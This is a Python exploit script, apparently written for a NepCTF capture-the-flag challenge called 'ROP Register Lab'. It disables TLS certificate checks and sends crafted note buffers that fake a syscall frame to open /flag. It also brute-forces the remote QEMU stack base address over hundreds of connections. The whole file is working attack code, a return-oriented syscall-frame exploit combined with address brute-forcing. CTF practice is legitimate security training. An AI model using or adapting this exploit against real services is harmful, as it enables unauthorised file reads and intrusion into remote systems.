#!/usr/bin/env python3
"""Brute-force remote note buffer base address."""
import socket, ssl, struct, time, sys

HOST = "fpztdaff-m4sy-lecb-yh9e-6a5acab230525-neptunus.nepctf.com"
PORT = 443

SYS_OPENAT = 56
SYS_READ   = 63
SYS_WRITE  = 64
AT_FDCWD = 0xFFFFFF9C
BSS_BUF  = 0x4bd88
TRAP0    = 0x2ba08
RESTART  = 0x21168

def build_note(base, sysno, r0, r1, r2, r3=0, r4=0, r5=0, flag_str=None):
    note = bytearray(64)
    struct.pack_into('<I', note, 4, r5)
    struct.pack_into('<I', note, 8, r4)
    struct.pack_into('<I', note, 12, r3)
    struct.pack_into('<I', note, 16, r2)
    struct.pack_into('<I', note, 20, r1)
    struct.pack_into('<I', note, 24, r0)
    struct.pack_into('<I', note, 28, sysno)
    if flag_str:
        note[32:32+len(flag_str)] = flag_str
    struct.pack_into('<I', note, 48, base + 56)
    struct.pack_into('<I', note, 52, TRAP0)
    struct.pack_into('<I', note, 56, base + 56)
    struct.pack_into('<I', note, 60, RESTART)
    return note

def try_base(base):
    """Try exploit with given note buffer base. Returns True if openat+restart works."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ssock = ctx.wrap_socket(sock, server_hostname=HOST)
        ssock.connect((HOST, PORT))

        # Read menu
        data = b''
        ssock.settimeout(3)
        while b'> ' not in data:
            try:
                data += ssock.recv(4096)
            except:
                break

        # Stage 1: openat with restart
        note1 = build_note(base, SYS_OPENAT, AT_FDCWD, base + 32, 0, flag_str=b'/flag\x00')
        ssock.send(b'3\n' + bytes(note1) + b'\n')

        # Wait for restart banner
        data = b''
        ssock.settimeout(4)
        while b'ROP Register Lab' not in data:
            try:
                chunk = ssock.recv(4096)
                if not chunk:
                    break
                data += chunk
            except:
                break

        ssock.close()

        # Check if we got "calibration data recorded" AND another "ROP Register Lab"
        text = data.decode(errors='replace')
        if 'ROP Register Lab' in text:
            # Restart worked!
            return True
        return False
    except Exception as e:
        return False

# Test range of base addresses
# Local base is 0x4080e4c0. QEMU user-mode stack is usually page-aligned.
# Try addresses from 0x40800000 to 0x40810000 in steps of 0x100
print("[*] Brute-forcing remote note buffer base address...")
print("[*] Local base was: 0x4080e4c0")

# Common QEMU stack regions
bases_to_try = []

# Try near local base first
for off in range(-0x2000, 0x2000, 0x100):
    bases_to_try.append(0x4080e4c0 + off)

# Also try common QEMU stack ranges
for b in [0x40008000, 0x40800000, 0x41000000, 0x3f800000,
          0x4000e000, 0x4080e000, 0x4080f000, 0x40810000]:
    for off in range(0, 0x1000, 0x100):
        bases_to_try.append(b + off)

seen = set()
unique = []
for b in bases_to_try:
    if b not in seen and (b & 0xFF) == 0xC0:  # Must end in 0xC0 like local
        seen.add(b)
        unique.append(b)

# Also try all b & 0xFF == 0xC0 in the 0x4080xxxx range
for addr in range(0x408000c0, 0x40820000, 0x100):
    if addr not in seen:
        unique.append(addr)

print(f"[*] Trying {len(unique)} unique addresses...")

found = None
for i, base in enumerate(unique):
    if found:
        break
    if i % 50 == 0:
        print(f"    Progress: {i}/{len(unique)} (trying 0x{base:08x})")
    if try_base(base):
        found = base
        print(f"\n*** FOUND! Remote note buffer base = 0x{base:08x} ***")
        break

if not found:
    print("\n[*] Base not found in scanned range. Trying wider search...")
    # Also try addresses with low byte != 0xC0
    for base in range(0x40800000, 0x40820000, 0x10):
        if base in seen:
            continue
        if (base - 48) & 0xF == 0:  # base+48 should be aligned
            if try_base(base):
                found = base
                print(f"\n*** FOUND! Remote note buffer base = 0x{base:08x} ***")
                break

if found:
    print(f"\n[*] Remote base: 0x{found:08x}")
    print(f"[*] Now run full 3-stage exploit with this base")
else:
    print("\n[*] Could not find base address")
